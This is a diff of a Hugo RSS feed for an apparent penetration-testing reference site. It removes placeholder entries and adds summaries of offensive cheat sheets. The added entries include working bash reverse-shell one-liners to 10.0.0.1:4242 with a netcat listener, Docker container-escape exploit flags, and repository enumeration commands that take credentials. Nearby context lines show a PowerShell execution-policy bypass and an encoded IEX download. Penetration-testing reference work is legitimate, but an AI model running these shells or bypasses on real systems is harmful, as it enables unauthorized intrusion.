@@ -7,42 +7,11 @@
     <generator>Hugo -- gohugo.io</generator>
     <copyright>2022</copyright><atom:link href="https://www.grayhatfreelancing.com/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>With ToC</title>
-      <link>https://www.grayhatfreelancing.com/docs/example/table-of-contents/with-toc/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/example/table-of-contents/with-toc/</guid>
-      <description>Caput vino delphine in tamen vias # Cognita laeva illo fracta # Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.
-Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit Natus quaerere # Pectora et sine mulcere, coniuge dum tincta incurvae.</description>
-    </item>
-    
-    <item>
-      <title>Without ToC</title>
-      <link>https://www.grayhatfreelancing.com/docs/example/table-of-contents/without-toc/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/example/table-of-contents/without-toc/</guid>
-      <description>At me ipso nepotibus nunc celebratior genus # Tanto oblite # Lorem markdownum pectora novis patenti igne sua opus aurae feras materiaque illic demersit imago et aristas questaque posset. Vomit quoque suo inhaesuro clara. Esse cumque, per referri triste. Ut exponit solisque communis in tendens vincetis agisque iamque huic bene ante vetat omina Thebae rates. Aeacus servat admonitu concidit, ad resimas vultus et rugas vultu dignamque Siphnon.
-Quam iugulum regia simulacra, plus meruit humo pecorumque haesit, ab discedunt dixit: ritu pharetramque.</description>
-    </item>
-    
-    <item>
-      <title>Migrate to Hugo from Jekyll</title>
-      <link>https://www.grayhatfreelancing.com/posts/migrate-from-jekyll/</link>
-      <pubDate>Mon, 10 Mar 2014 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/posts/migrate-from-jekyll/</guid>
-      <description>Move static content to static # Jekyll has a rule that any directory not starting with _ will be copied as-is to the _site output. Hugo keeps all static content under static. You should therefore move it all there. With Jekyll, something that looked like
-▾ &amp;lt;root&amp;gt;/ ▾ images/ logo.png should become
-▾ &amp;lt;root&amp;gt;/ ▾ static/ ▾ images/ logo.png Additionally, you&amp;rsquo;ll want any files that should reside at the root (such as CNAME) to be moved to static.</description>
-    </item>
-    
-    <item>
       <title>Updating a github repository after cloning</title>
-      <link>https://www.grayhatfreelancing.com/posts/creating-a-new-theme/</link>
+      <link>https://www.grayhatfreelancing.com/posts/update-github-repo/</link>
       <pubDate>Wed, 28 Dec 2022 00:00:00 +0000</pubDate>
       
-      <guid>https://www.grayhatfreelancing.com/posts/creating-a-new-theme/</guid>
+      <guid>https://www.grayhatfreelancing.com/posts/update-github-repo/</guid>
       <description>Updating Github Repos # Yeah, I agree. Once they removed the easy ability to push updates to a repository after cloning (over http(s)). It&amp;rsquo;s been a nuisance to create your own or fork another, clone it, update the remotes for SSH and then get back to business. This reference is just a quick 1, 2, 3&amp;hellip; to-do/check list of steps for ease of reference!
 Create repository on Github - Go to the website and just create one using their form, get the empty skeleton Clone repository - git clone &amp;lt;your repo&amp;gt; Remove remotes - git remote remove origin Add SSH remotes - git remote add origin git@github.</description>
     </item>
@@ -309,6 +278,35 @@ Get-SQLDatabase -Username sa -Password Password1234 -Instance &amp;#34;&amp;lt;D
       
       <guid>https://www.grayhatfreelancing.com/docs/powershell_cheatsheet/</guid>
       <description>Powershell # Summary # Execution Policy Encoded Commands Download file Load Powershell scripts Load C# assembly reflectively Secure String to Plaintext References Execution Policy # powershell -EncodedCommand $encodedCommand powershell -ep bypass ./PowerView.ps1 # Change execution policy Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted Set-ExecutionPolicy Bypass -Scope Process Constrained Mode # # Check if we are in a constrained mode # Values could be: FullLanguage or ConstrainedLanguage $ExecutionContext.SessionState.LanguageMode ## Bypass powershell -version 2 Encoded Commands # Windows $command = &amp;#39;IEX (New-Object Net.</description>
+    </item>
+    
+    <item>
+      <title>Reverse Shell Cheatsheet</title>
+      <link>https://www.grayhatfreelancing.com/docs/reverse_shell_cheatsheet/</link>
+      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/reverse_shell_cheatsheet/</guid>
+      <description>Reverse Shell Cheat Sheet # Tools # reverse-shell-generator - Hosted Reverse Shell generator (source) revshellgen - CLI Reverse Shell generator Reverse Shell # Bash TCP # bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4242 0&amp;gt;&amp;amp;1 0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/10.0.0.1/4242; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196 /bin/bash -l &amp;gt; /dev/tcp/10.0.0.1/4242 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1 Bash UDP # Victim: sh -i &amp;gt;&amp;amp; /dev/udp/10.0.0.1/4242 0&amp;gt;&amp;amp;1 Listener: nc -u -lvp 4242 Don&amp;rsquo;t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</description>
+    </item>
+    
+    <item>
+      <title>Source Code Management</title>
+      <link>https://www.grayhatfreelancing.com/docs/source_code_management/</link>
+      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/source_code_management/</guid>
+      <description>Source Code Management # Enumeration # Using SCMKit - Source Code Management Attack Toolkit
+Discover repositories being used in a particular SCM system SCMKit.exe -s gitlab -m listrepo -c userName:password -u https://gitlab.something.local SCMKit.exe -s gitlab -m listrepo -c apiKey -u https://gitlab.something.local Search for repositories by repository name in a particular SCM system SCMKit.exe -s github -m searchrepo -c userName:password -u https://github.something.local -o &amp;#34;some search term&amp;#34; SCMKit.exe -s gitlab -m searchrepo -c apikey -u https://gitlab.</description>
+    </item>
+    
+    <item>
+      <title>Docker Security</title>
+      <link>https://www.grayhatfreelancing.com/docs/docker_pentesting/</link>
+      <pubDate>Wed, 26 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/docker_pentesting/</guid>
+      <description>Docker Pentest # Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers.
+Tools # Dockscan : Dockscan is security vulnerability and audit scanner for Docker installations dockscan unix:///var/run/docker.sock dockscan -r html -o myreport -v tcp://example.com:5422 DeepCe : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) ./deepce.sh ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce ./deepce.sh --no-enumeration --exploit SOCK --shadow .</description>
     </item>
     
   </channel>
